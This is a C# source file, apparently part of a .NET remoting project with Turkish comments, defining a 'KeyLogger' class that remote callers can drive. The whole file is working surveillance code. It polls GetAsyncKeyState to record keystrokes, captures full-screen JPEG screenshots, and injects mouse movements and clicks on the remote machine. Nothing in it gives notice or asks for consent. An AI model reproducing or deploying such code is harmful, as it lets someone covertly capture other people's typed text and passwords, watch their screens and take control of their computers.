using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ibrahim.RemoteObject
{
    public class KeyLogger : MarshalByRefObject, IKeyLogger
    {
        Stack<KeyInfo> keys;
        System.Timers.Timer tmrKeyLogger;
        List<Keys> hookedKeys;

        public KeyLogger()
        {
            keys = new Stack<KeyInfo>();
            hookedKeys = new List<Keys>();
            tmrKeyLogger = new System.Timers.Timer();
            tmrKeyLogger.Interval = 10;
            tmrKeyLogger.Elapsed += TmrKeyLogger_Elapsed;
        }
        private void TmrKeyLogger_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            foreach (int ascii in Enum.GetValues(typeof(Keys)))
            {
                if (!hookedKeys.Contains((Keys)ascii))
                    continue;

                //0x1 Key Up durumudur
                if ((GetAsyncKeyState(ascii) & 0x1) == 0x1)
                {
                    KeyInfo key;
                    switch (ascii)
                    {
                        case 222://İ
                            key = new KeyInfo(222, "İ");
                            break;
                        case 220://Ç
                            key = new KeyInfo(220, "Ç");
                            break;
                        case 219://Ğ
                            key = new KeyInfo(219, "Ğ");
                            break;
                        case 191://Ö
                            key = new KeyInfo(191, "Ö");
                            break;
                        case 221://Ü
                            key = new KeyInfo(221, "Ü");
                            break;
                        case 186://Ş
                            key = new KeyInfo(186, "Ş");
                            break;
                        default:
                            key = new KeyInfo(ascii, Enum.GetName(typeof(Keys), ascii));
                            break;
                    }
                    keys.Push(key);
                }
            }
        }
        


        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        public KeyInfo GetLastKey()
        {
            if (keys.Count != 0)
                return keys.Peek();
            else
                return null;
        }

        public void Start()
        {
            tmrKeyLogger.Enabled = true;
        }

        public void Stop()
        {
            tmrKeyLogger.Enabled = false;
        }

        public void SetHookedKeys(int[] keys)
        {
            hookedKeys.Clear();
            foreach (int ascii in keys)
            {
                hookedKeys.Add((Keys)ascii);
            }
        }

        public Size GetRemoteScreenSize()
        {
            return Screen.PrimaryScreen.Bounds.Size;
        }

        public byte[] GetScreenImage()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            //Bitmap to byte array
            MemoryStream ms = new MemoryStream();
            bmp.Save(ms,ImageFormat.Jpeg);

            return ms.GetBuffer();
        }

        //karşı makinenin faresini kontrol etmek için gereken kodlar aşağıdadır

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

        public void SendMouseEvent(MouseEventType eventType, uint x, uint y)
        {
            uint button_type = 0;
            switch (eventType)
            {
                case MouseEventType.LeftDown:
                    button_type= 0x02;
                    break;
                case MouseEventType.LeftUp:
                    button_type= 0x04;
                    break;
                case MouseEventType.RightDown:
                    button_type= 0x08;
                    break;
                case MouseEventType.RightUp:
                    button_type = 0x10;
                    break;
                case MouseEventType.Move:
                    button_type = 0x01;
                    break;
                default:
                    break;
            }
            mouse_event(button_type, x, y, 0,0);
        }

        public void SendMovePosition(Point movePoint)
        {
            System.Windows.Forms.Cursor.Position = movePoint;
        }

        //private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
        //private const uint MOUSEEVENTF_LEFTUP = 0x04;
        //private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
        //private const uint MOUSEEVENTF_RIGHTUP = 0x10;
        //private const uint MOUSEEVENTF_MOVE = 0x01;
    }
}
